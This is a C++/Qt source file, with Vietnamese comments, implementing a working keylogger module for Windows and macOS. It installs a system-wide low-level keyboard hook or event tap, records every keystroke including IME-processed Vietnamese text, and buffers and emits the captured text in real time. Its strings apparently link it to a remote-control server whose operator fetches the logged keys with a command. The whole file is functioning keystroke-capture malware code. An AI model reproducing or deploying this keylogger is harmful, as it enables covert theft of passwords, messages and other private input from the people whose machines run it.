#include "KeyloggerModule.h"

#include <QDebug>
#include <QDateTime>
#include <QMetaObject>

#ifdef Q_OS_WIN
#include <Windows.h>
#endif

#ifdef Q_OS_MACOS
#include <ApplicationServices/ApplicationServices.h>
#endif


//=========================================
// Static members
//=========================================

#ifdef Q_OS_WIN
KeyloggerModule* KeyloggerModule::instance = nullptr;
void* KeyloggerModule::hookHandle = nullptr;
#endif

#ifdef Q_OS_MACOS
KeyloggerModule* KeyloggerModule::instance = nullptr;
#endif


//=========================================
// Constructor / Destructor
//=========================================

KeyloggerModule::KeyloggerModule(QObject *parent)
    : QObject(parent), running(false)
{
#ifdef Q_OS_WIN
    instance = this;
#endif

#ifdef Q_OS_MACOS
    instance = this;
    eventTap = nullptr;
    runLoopSource = nullptr;
    tapThread = nullptr;
#endif

    // Debounce timer: 50ms single-shot
    // Nhóm các sự kiện BS+retype của Unikey/Telex thành 1 lần gửi
    debounceTimer = new QTimer(this);
    debounceTimer->setSingleShot(true);
    debounceTimer->setInterval(50);
    connect(debounceTimer, &QTimer::timeout,
            this, &KeyloggerModule::onDebounceTimeout);
}

KeyloggerModule::~KeyloggerModule()
{
    if (running)
    {
        stopKeylogger();
    }
}


//---------------------------------------------------
// Debounce: gọi khi timer 50ms hết
// Gửi pendingChars ra ngoài qua signal
//---------------------------------------------------

void KeyloggerModule::onDebounceTimeout()
{
    QMutexLocker locker(&mutex);

    if (!pendingChars.isEmpty())
    {
        QString text = pendingChars;
        pendingChars.clear();
        locker.unlock();

        // Gửi real-time
        emit keyTextCaptured(text);
    }
}


//---------------------------------------------------
// Bắt debounce timer (thread-safe slot)
// Được gọi từ hook callback qua QMetaObject::invokeMethod
//---------------------------------------------------

void KeyloggerModule::startDebounce()
{
    debounceTimer->start(50);
}


//=========================================
// WINDOWS IMPLEMENTATION
//=========================================

#ifdef Q_OS_WIN

//---------------------------------------------------
// Windows Keyboard Hook Callback
//
// Dùng WH_KEYBOARD_LL để bắt keystroke
// Xử lý:
// - VK_PACKET: ký tự Unicode từ IME (Unikey/EVKey)
// - VK_BACK: backspace (Unikey gửi BS khi thay ký tự)
// - Khác: ToUnicode() để lấy ký tự sau keyboard layout
//
// Kết quả: ký tự SAU KHI IME xử lý (hỗ trợ Telex)
//---------------------------------------------------

long __stdcall KeyloggerModule::keyboardProc(int nCode,
                                              unsigned long long wParam,
                                              long long lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;

        // Bỏ qua các phím modifier đơn lẻ
        if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT ||
            vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL ||
            vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU ||
            vkCode == VK_CAPITAL)
        {
            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
        }

        if (!instance) goto next;

        // ── VK_BACK: Backspace ──
        // Unikey/EVKey gửi BS để xóa ký tự cũ trước khi gửi ký tự mới
        if (vkCode == VK_BACK)
        {
            QMutexLocker locker(&instance->mutex);

            if (!instance->pendingChars.isEmpty())
            {
                // Xóa ký tự chưa gửi (đang trong debounce window)
                instance->pendingChars.chop(1);
            }
            else
            {
                // Ký tự đã gửi rồi → gửi BS cho client xóa
                instance->pendingChars += QChar('\b');
            }

            // Cập nhật keyBuffer cho GET_KEYLOGGER_DATA
            if (!instance->keyBuffer.isEmpty())
            {
                instance->keyBuffer.removeLast();
            }

            // Restart debounce
            QMetaObject::invokeMethod(instance, "startDebounce",
                                      Qt::QueuedConnection);

            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
        }

        // ── VK_PACKET: Unicode từ SendInput (Unikey/EVKey) ──
        if (vkCode == VK_PACKET)
        {
            // scanCode chứa Unicode code point
            QChar ch((ushort)kbStruct->scanCode);
            QString keyText(ch);

            QMutexLocker locker(&instance->mutex);
            instance->pendingChars += keyText;
            instance->keyBuffer.append(keyText);

            QMetaObject::invokeMethod(instance, "startDebounce",
                                      Qt::QueuedConnection);

            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
        }

        // ── VK_RETURN: Enter ──
        if (vkCode == VK_RETURN)
        {
            QMutexLocker locker(&instance->mutex);
            instance->pendingChars += "\n";
            instance->keyBuffer.append("\n");

            QMetaObject::invokeMethod(instance, "startDebounce",
                                      Qt::QueuedConnection);

            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
        }

        // ── VK_TAB ──
        if (vkCode == VK_TAB)
        {
            QMutexLocker locker(&instance->mutex);
            instance->pendingChars += "\t";
            instance->keyBuffer.append("\t");

            QMetaObject::invokeMethod(instance, "startDebounce",
                                      Qt::QueuedConnection);

            return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
        }

        // ── Phím thường: dùng ToUnicode() ──
        {
            BYTE keyboardState[256];
            GetKeyboardState(keyboardState);

            WCHAR buffer[4];
            int result = ToUnicode(vkCode, kbStruct->scanCode,
                                   keyboardState, buffer, 4, 0);

            if (result > 0)
            {
                QString keyText = QString::fromWCharArray(buffer, result);

                QMutexLocker locker(&instance->mutex);
                instance->pendingChars += keyText;
                instance->keyBuffer.append(keyText);

                QMetaObject::invokeMethod(instance, "startDebounce",
                                          Qt::QueuedConnection);
            }
        }
    }

next:
    return CallNextHookEx((HHOOK)hookHandle, nCode, wParam, lParam);
}

#endif // Q_OS_WIN


//=========================================
// macOS IMPLEMENTATION
//=========================================

#ifdef Q_OS_MACOS

//---------------------------------------------------
// Kiểm tra Accessibility Permission
//---------------------------------------------------

bool KeyloggerModule::checkAccessibilityPermission()
{
    bool trusted = AXIsProcessTrusted();

    if (!trusted)
    {
        qDebug() << "Accessibility permission NOT granted!";
        qDebug() << "Go to: System Settings > Privacy & Security"
                 << "> Accessibility and enable RemoteControlServer";
    }

    return trusted;
}


//---------------------------------------------------
// CGEventTap Callback
//
// CGEventKeyboardGetUnicodeString trả về ký tự
// SAU KHI macOS IME xử lý (hỗ trợ Vietnamese Telex)
//---------------------------------------------------

void* KeyloggerModule::eventCallback(void* proxy,
                                      unsigned long type,
                                      void* event,
                                      void* userInfo)
{
    Q_UNUSED(proxy)
    Q_UNUSED(userInfo)

    CGEventRef cgEvent = (CGEventRef)event;
    CGEventType eventType = (CGEventType)type;

    if (eventType != kCGEventKeyDown)
    {
        return event;
    }

    CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(
        cgEvent, kCGKeyboardEventKeycode);

    if (!instance) return event;

    // ── Backspace (keyCode 51) ──
    if (keyCode == 51)
    {
        QMutexLocker locker(&instance->mutex);

        if (!instance->pendingChars.isEmpty())
        {
            instance->pendingChars.chop(1);
        }
        else
        {
            instance->pendingChars += QChar('\b');
        }

        if (!instance->keyBuffer.isEmpty())
        {
            instance->keyBuffer.removeLast();
        }

        QMetaObject::invokeMethod(instance, "startDebounce",
                                  Qt::QueuedConnection);
        return event;
    }

    // ── Enter (keyCode 36) ──
    if (keyCode == 36)
    {
        QMutexLocker locker(&instance->mutex);
        instance->pendingChars += "\n";
        instance->keyBuffer.append("\n");

        QMetaObject::invokeMethod(instance, "startDebounce",
                                  Qt::QueuedConnection);
        return event;
    }

    // ── Tab (keyCode 48) ──
    if (keyCode == 48)
    {
        QMutexLocker locker(&instance->mutex);
        instance->pendingChars += "\t";
        instance->keyBuffer.append("\t");

        QMetaObject::invokeMethod(instance, "startDebounce",
                                  Qt::QueuedConnection);
        return event;
    }

    // ── Bỏ qua modifier keys ──
    // Shift=56, Ctrl=59, Option=58, Command=55
    if (keyCode == 56 || keyCode == 59 || keyCode == 58 ||
        keyCode == 55 || keyCode == 54 || keyCode == 53)
    {
        return event;
    }

    // ── Ký tự thường: lấy Unicode từ event ──
    {
        UniChar chars[4];
        UniCharCount actualLength = 0;
        CGEventKeyboardGetUnicodeString(
            cgEvent, 4, &actualLength, chars);

        if (actualLength > 0)
        {
            QString keyText = QString::fromUtf16(chars, actualLength);

            QMutexLocker locker(&instance->mutex);
            instance->pendingChars += keyText;
            instance->keyBuffer.append(keyText);

            QMetaObject::invokeMethod(instance, "startDebounce",
                                      Qt::QueuedConnection);
        }
    }

    return event;
}


//---------------------------------------------------
// Chạy CFRunLoop trong thread riêng
//---------------------------------------------------

void KeyloggerModule::runMacEventLoop()
{
    CGEventMask eventMask = CGEventMaskBit(kCGEventKeyDown);

    CFMachPortRef tap = CGEventTapCreate(
        kCGSessionEventTap,
        kCGHeadInsertEventTap,
        kCGEventTapOptionListenOnly,
        eventMask,
        (CGEventTapCallBack)eventCallback,
        nullptr
    );

    if (!tap)
    {
        qDebug() << "Failed to create CGEventTap!";
        return;
    }

    eventTap = (void*)tap;

    CFRunLoopSourceRef source = CFMachPortCreateRunLoopSource(
        kCFAllocatorDefault, tap, 0);
    runLoopSource = (void*)source;

    CFRunLoopAddSource(CFRunLoopGetCurrent(), source,
                       kCFRunLoopCommonModes);
    CGEventTapEnable(tap, true);

    qDebug() << "macOS CGEventTap started.";

    CFRunLoopRun();

    qDebug() << "macOS event loop stopped.";
}

#endif // Q_OS_MACOS


//=========================================
// PUBLIC METHODS
//=========================================

QString KeyloggerModule::startKeylogger()
{
    if (running)
    {
        return "FAIL: Keylogger already running";
    }

#ifdef Q_OS_WIN
    hookHandle = (void*)SetWindowsHookEx(WH_KEYBOARD_LL,
                                          (HOOKPROC)keyboardProc,
                                          GetModuleHandle(NULL),
                                          0);
    if (hookHandle == nullptr)
    {
        qDebug() << "Failed to set keyboard hook!";
        return "FAIL: Cannot set keyboard hook";
    }

    running = true;
    keyBuffer.clear();
    pendingChars.clear();

    qDebug() << "Keylogger started (Windows).";
    return "SUCCESS";

#elif defined(Q_OS_MACOS)
    if (!checkAccessibilityPermission())
    {
        return "FAIL: Accessibility permission required. "
               "Go to System Settings > Privacy & Security > "
               "Accessibility and enable RemoteControlServer.";
    }

    keyBuffer.clear();
    pendingChars.clear();

    tapThread = QThread::create([this]()
    {
        runMacEventLoop();
    });
    tapThread->start();
    running = true;

    qDebug() << "Keylogger started (macOS).";
    return "SUCCESS";

#else
    return "FAIL: Keylogger not supported on this OS";
#endif
}


QString KeyloggerModule::stopKeylogger()
{
    if (!running)
    {
        return "FAIL: Keylogger not running";
    }

    // Flush pending chars trước khi dừng
    if (debounceTimer->isActive())
    {
        debounceTimer->stop();
        onDebounceTimeout();
    }

#ifdef Q_OS_WIN
    if (hookHandle)
    {
        UnhookWindowsHookEx((HHOOK)hookHandle);
        hookHandle = nullptr;
    }
#endif

#ifdef Q_OS_MACOS
    if (eventTap)
    {
        CGEventTapEnable((CFMachPortRef)eventTap, false);
    }

    if (tapThread && tapThread->isRunning())
    {
        CFRunLoopStop(CFRunLoopGetMain());
        tapThread->quit();
        tapThread->wait(3000);

        if (tapThread->isRunning())
        {
            tapThread->terminate();
            tapThread->wait(1000);
        }
    }

    if (runLoopSource)
    {
        CFRelease((CFRunLoopSourceRef)runLoopSource);
        runLoopSource = nullptr;
    }
    if (eventTap)
    {
        CFRelease((CFMachPortRef)eventTap);
        eventTap = nullptr;
    }

    delete tapThread;
    tapThread = nullptr;
#endif

    running = false;
    qDebug() << "Keylogger stopped.";
    return "SUCCESS";
}


QString KeyloggerModule::getKeyloggerData()
{
    QMutexLocker locker(&mutex);

    if (keyBuffer.isEmpty())
    {
        return "(No keys recorded)";
    }

    return keyBuffer.join("");
}


bool KeyloggerModule::isRunning() const
{
    return running;
}
